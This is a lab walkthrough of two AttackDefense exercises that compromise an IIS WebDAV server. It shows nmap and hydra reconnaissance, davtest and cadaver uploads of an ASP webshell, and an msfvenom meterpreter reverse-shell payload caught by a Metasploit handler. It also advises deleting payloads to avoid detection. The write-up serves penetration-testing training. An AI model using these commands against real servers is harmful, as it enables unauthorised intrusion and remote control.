# 🔬IIS - WebDAV

## Lab 1

> 🔬 [Windows: IIS Server DAVTest](https://attackdefense.com/challengedetails?cid=2317)
>
> * Target IP: `10.0.16.192`
> * **IIS** exploitation
> * Credentials provided: `bob`:`password_123321`

```bash
ping -c 4 10.0.16.192

nmap -sV -sC 10.0.16.192
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-06-29 15:18 IST
Nmap scan report for 10.0.16.192
Host is up (0.0019s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to /Default.aspx
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/10.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
|   Server Date: Sat, 29 Jun 2024 09:48:31 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_  WebDAV type: Unknown
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DOTNETGOAT
|   NetBIOS_Domain_Name: DOTNETGOAT
|   NetBIOS_Computer_Name: DOTNETGOAT
|   DNS_Domain_Name: DotNetGoat
|   DNS_Computer_Name: DotNetGoat
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-29T09:48:31+00:00
| ssl-cert: Subject: commonName=DotNetGoat
| Not valid before: 2024-06-28T09:45:30
|_Not valid after:  2024-12-28T09:45:30
|_ssl-date: 2024-06-29T09:48:39+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-29T09:48:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.14 seconds
```

<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Perform `http-enum` nmap script to gain more information onto the web directory.

```bash
nmap -sV -script http-enum -p80 10.0.16.192
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-06-29 15:24 IST
Nmap scan report for 10.0.16.192
Host is up (0.0024s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
```

{% hint style="info" %}
**401 Unauthorized** which means authentication has been enabled on this WebDAV server.
{% endhint %}

<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Authentication Required</p></figcaption></figure>

### hydra

* The credentials already provided, this is just a additional brute force to obtain the username and password.

{% hint style="danger" %}
Be careful with brute-force attack as it could potentially cause a DOS (Denial of Service)
{% endhint %}

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.0.16.192 http-get /webdav/
```

```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-29 15:40:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:8/p:50), ~25 tries per task
[DATA] attacking http-get://10.0.16.192:80/webdav/
1 of 1 target completed, 0 valid password found
```

<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### davtest

It sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files, then it tries to execute uploaded files and gives an output of successfully executed files.

* In this case, the result will show DAV testing connection is `OPEN` but it's `FAIL` due to the authentication is enabled.

```bash
davtest -url http://10.0.16.192/webdav 
```

```bash
********************************************************
 Testing DAV connection
OPEN		FAIL:	http://10.0.16.192/webdav	Unauthorized. Basic realm="10.0.16.192"
```

* Use the provided credentials with `davtest` again.

```bash
davtest -auth bob:password_123321 -url http://10.0.27.191/webdav
```

> davtest will perform a series of checks that will tell what types of files can upload and execute on the webdav server.

```bash
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.0.27.191/webdav
********************************************************
NOTE	Random string for this session: qoKbVVGT8BuAu
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu
********************************************************
 Sending test files
PUT	pl	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.pl
PUT	jsp	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.jsp
PUT	jhtml	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.jhtml
PUT	php	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.php
PUT	html	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.html
PUT	asp	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.asp
PUT	shtml	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.shtml
PUT	aspx	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.aspx
PUT	cfm	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.cfm
PUT	cgi	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.cgi
PUT	txt	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.txt
********************************************************
 Checking for test file execution
EXEC	pl	FAIL
EXEC	jsp	FAIL
EXEC	jhtml	FAIL
EXEC	php	FAIL
EXEC	html	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.html
EXEC	asp	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.asp
EXEC	shtml	FAIL
EXEC	aspx	FAIL
EXEC	cfm	FAIL
EXEC	cgi	FAIL
EXEC	txt	SUCCEED:	http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.txt

********************************************************
/usr/bin/davtest Summary:
Created: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.pl
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.jsp
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.jhtml
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.php
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.html
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.asp
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.shtml
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.aspx
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.cfm
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.cgi
PUT File: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.txt
Executes: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.html
Executes: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.asp
Executes: http://10.0.27.191/webdav/DavTestDir_qoKbVVGT8BuAu/davtest_qoKbVVGT8BuAu.txt
```

> 📌 Summary:
>
> * All important file types can be uploaded to the `/webdav` directory
> * `.txt`, `.asp`, `.html` files can be executed

### cadaver

* Use `cadaver` to upload an `.asp` payload to the `/webdav` directory

> cadaver allow to access the contents of the actual `/webdav` directory  which enable users to `download`, `upload`, and `edit` files.

```bash
cadaver http://10.0.27.191/webdav
```

```bash
Authentication required for 10.0.27.191 on server `10.0.27.191':
Username: bob
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_qoKbVVGT8BuAu               0  Jun 29 16:16
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
```

* In this case, upload `webshell.asp` as it can be executed on the `/webdav` directory by using the local dictionary file.

```bash
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
```

<figure><img src="../../../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>webdav directory</p></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>uploaded when performing davtest </p></figcaption></figure>

* Access the backdoor using the browser or navigate to the `webshell.asp` that has been uploaded
  * `http://10.3.26.115/webdav/webshell.asp`
* Windows commands can be provided in the box

<figure><img src="../../../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>webshell.asp</p></figcaption></figure>

* Run `whoami`, `ipconfig` or other commands to find the flag

<figure><img src="../../../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* `dir C:\` command

<figure><img src="../../../../../.gitbook/assets/image (22) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`type C:\flag.txt` command

<figure><img src="../../../../../.gitbook/assets/image (23) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `0cc175b9c0f1b6a831c399e269772661`
{% endhint %}

***

## Lab 2 <a href="#lab-2" id="lab-2"></a>

> 🔬 [Windows: IIS Server: WebDav Metasploit](https://attackdefense.com/challengedetails?cid=2319)
>
> * Target IP: `10.0.17.242`/`10.0.27.155`(lab reset)
> * Local IP: `10.10.16.2`
> * IIS exploitation with Metasploit
> * Credentials provided: `bob`:`password_123321`

```bash
nmap -sV --script http-enum -p80 10.0.17.242
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2024-06-29 20:00 IST
Nmap scan report for 10.0.17.242
Host is up (0.0029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
```

* Use [Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/iis/iis\_webdav\_upload\_asp/) to execute a payload and optain a **reverse shell** (**`meterpreter session`**) on the target system or use `msfvenom` to manually create a payload and use it with metasploit.

### [msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) - manual <a href="#msfvenom-manual" id="msfvenom-manual"></a>

* Generate `.asp` payload manually using `msfvenom`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=1234 .f asp > shell.asp 
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38309 bytes

root@attackdefense:~# ls
Desktop  impacket  shell.asp  thinclient_drives
```

* Use `cadaver` to upload the generated `shell.asp` payload to the `/webdav` directory

```bash
cadaver http://10.0.17.242/webdav
```

```bash
dav:/webdav/> put shell.asp 
Uploading shell.asp to `/webdav/shell.asp':
Progress: [=============================>] 100.0% of 354 bytes succeeded.
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Before executing the `shell.asp`, _setup a **listener**/**handler** that will receive the reverse connection from the target and send the stage that provides with a `meterpreter` session when executed_.

* In order to do this, start the PostgreSQL database service, because metasploit framework console requires the metasploit framework to be started

```bash
service postgresql start && msfconsole
```

* Setup a [Metasploit handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), using the same payload, LHOST, LPORT used to generate the `shell.asp` file within the `msfvenom`

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.2
msf6 exploit(multi/handler) > set LPORT 1234
msf6 exploit(multi/handler) > run
```

* The listener (reverse TCP handler) starts listening and waits for a connection from the actual `shell.asp` payload

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Open the `http://10.4.18.218/webdav` link in the browser and execute `shell.asp` file
* The **Meterpreter** session will be opened and successfully gained access to the target system

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Confirm this with `sysinfo`

```bash
meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

* Get the user that the server is running as with `getuid`

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> 📌 No privilege escalation needed since the user is `NT AUTHORITY\SYSTEM`

* Find the flag, running `meterpreter` commands

```bash
meterpreter > pwd
c:\windows\system32\inetsrv

meterpreter > shell
Process 3464 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd \  
cd \

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of c:\

11/14/2018  06:56 AM    <DIR>          EFI
01/04/2021  07:22 AM                32 flag.txt
10/27/2020  06:45 AM    <DIR>          inetpub
05/13/2020  05:58 PM    <DIR>          PerfLogs
10/27/2020  02:18 PM    <DIR>          Program Files
10/27/2020  02:18 PM    <DIR>          Program Files (x86)
10/27/2020  02:21 PM    <DIR>          Users
10/27/2020  06:46 AM    <DIR>          Windows
               1 File(s)             32 bytes
               7 Dir(s)  16,350,052,352 bytes free

c:\>type flag.txt
type flag.txt
d3aff16a801b4b7d36b4da1094bee345
```

{% hint style="warning" %}
Make sure to delete all the generated payload after uploaded onto the target system to avoid detection!
{% endhint %}

```bash
cadaver http://10.4.18.218/webdav
delete shell.asp
```

<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>shell.asp deleted</p></figcaption></figure>

### metasploit - automatic <a href="#metasploit-automatic" id="metasploit-automatic"></a>

* Use Metasploit [iis\_webdav\_upload\_asp](https://www.rapid7.com/db/modules/exploit/windows/iis/iis\_webdav\_upload\_asp/) module to get a `meterpreter` session on the target system.

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* _This exploit automatically deleted the `/webdav/metasploit.asp` payload_
* Find the flag, running `meterpreter` commands

```bash
shell
cd \
dir
type flag.txt
```

{% hint style="info" %}
Metasploit will automatically delete the generated `metasploit.asp` payload
{% endhint %}

{% hint style="success" %}
Flag: `d3aff16a801b4b7d36b4da1094bee345`
{% endhint %}

